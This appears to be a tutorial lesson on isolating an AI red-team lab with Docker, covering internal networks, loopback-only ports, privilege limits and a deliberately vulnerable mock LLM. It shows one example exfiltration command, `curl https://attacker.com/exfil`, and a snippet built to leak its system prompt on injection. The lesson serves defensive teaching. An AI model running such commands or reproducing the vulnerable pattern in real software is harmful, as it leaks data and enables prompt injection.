# 04 — Docker Sandbox Design

## Learning Objectives
- Explain why `internal: true` is the critical safety control
- Identify what `127.0.0.1:8080:5000` means and why it's safer than `8080:5000`
- Verify network isolation using Docker CLI commands
- Understand the MockVulnerableLLM design decision

## Prerequisites
[[03-MITRE-ATLAS-Overview]]

---

## The Problem: Testing Real Attacks Safely

We need to test real attacks — path traversal, command injection, prompt injection. But we don't want:
- Target containers to exfiltrate data to the internet
- Target containers to attack services on the host machine
- A compromised container to pivot to other systems

Docker's default networking doesn't help much. By default, containers CAN reach the internet.

---

## Solution: Docker Internal Network

The key line in `docker/docker-compose.yml`:

```yaml
networks:
  redteam-isolated:
    driver: bridge
    internal: true    # ← This is the critical control
```

`internal: true` tells Docker to **not create a route to the internet gateway** on this bridge network.

What this means in practice:
- Target containers **cannot** send HTTP requests to `api.anthropic.com`
- Target containers **cannot** call home to an attacker's C2 server
- Target containers **can** still talk to each other on the same network
- Target containers **can** be reached from the host on localhost ports

This is a hard network-level control, not a software restriction. Even if the `target-agent` container is compromised and runs `curl https://attacker.com/exfil`, that packet will be dropped by the kernel — there is no route.

---

## Port Binding: Loopback Only

All target ports are bound to `127.0.0.1`:

```yaml
ports:
  - "127.0.0.1:8080:5000"   # ← SAFE
  # vs
  - "8080:5000"             # ← UNSAFE (binds on all interfaces including LAN)
```

`127.0.0.1:8080:5000` means:
- The container's port 5000 is reachable from the host
- Only on the loopback interface (your own machine)
- NOT exposed on your WiFi/Ethernet interface — so other devices on your network can't reach the lab

---

## MockVulnerableLLM: Why No Real Claude in Containers

The elegant solution to the `internal: true` + Anthropic API conflict:

**Problem**: Target containers need a "brain" (LLM) to demonstrate vulnerabilities, but the real
Anthropic API requires internet access.

**Solution**: `docker/shared/mock_llm.py` — a rule-based simulator that:
- Returns predictable, intentionally vulnerable responses
- Requires zero internet access
- Makes attack results deterministic (same payload = same result every time)

```python
# docker/shared/mock_llm.py
if any(t in user_message for t in INJECTION_TRIGGERS):
    return f"[INJECTION SUCCESS] Original system was: '{system}'"
```

**Result**: Full `internal: true` isolation + deterministic findings + zero API cost for targets.

The real Anthropic API is used **only** by the attacking agents running on the host.

---

## Security Options: Defense in Depth

Each container also has:

```yaml
security_opt: [no-new-privileges:true]
mem_limit: 256m
```

`no-new-privileges:true`: Even if an attacker gets code execution inside the container,
they cannot use setuid binaries to become root. Any process in the container can only have
the same or fewer privileges than the container's startup process.

`mem_limit`: Prevents resource exhaustion attacks from affecting the host.

`target-agent` additionally has:
```yaml
cap_drop: [ALL]
cap_add: [CHOWN, SETUID]
```
Drops all Linux capabilities, adds back only the minimum needed. This means even with
a full container escape, the attacker cannot use raw sockets, load kernel modules, etc.

---

## Hands-On Exercise

**Step 1**: Start the lab and verify isolation
```bash
bash scripts/start_lab.sh
docker network inspect agentic-ai-red-team_redteam-isolated
```

Look for `"Internal": true` in the output.

**Step 2**: Confirm containers can't reach the internet
```bash
docker exec $(docker ps -qf name=target-chatbot) \
  curl -s --max-time 3 https://api.anthropic.com || echo "BLOCKED — as expected"
```

Expected output: `BLOCKED — as expected` (or a timeout error)

**Step 3**: Confirm host CAN reach targets
```bash
curl -s http://localhost:8080/health | python3 -m json.tool
```

---

## Common Mistakes

**"I removed `internal: true` to use real Claude"** — This defeats the isolation. Instead,
use `USE_REAL_LLM=true` in `.env` which documents this tradeoff explicitly.

**"The target containers can still talk to each other"** — Yes, and that's intentional.
`target-multiagent` needs to call `target-webagent`. Internal networking is preserved.

---

## Next Step
→ [[05-CrewAI-Architecture]]
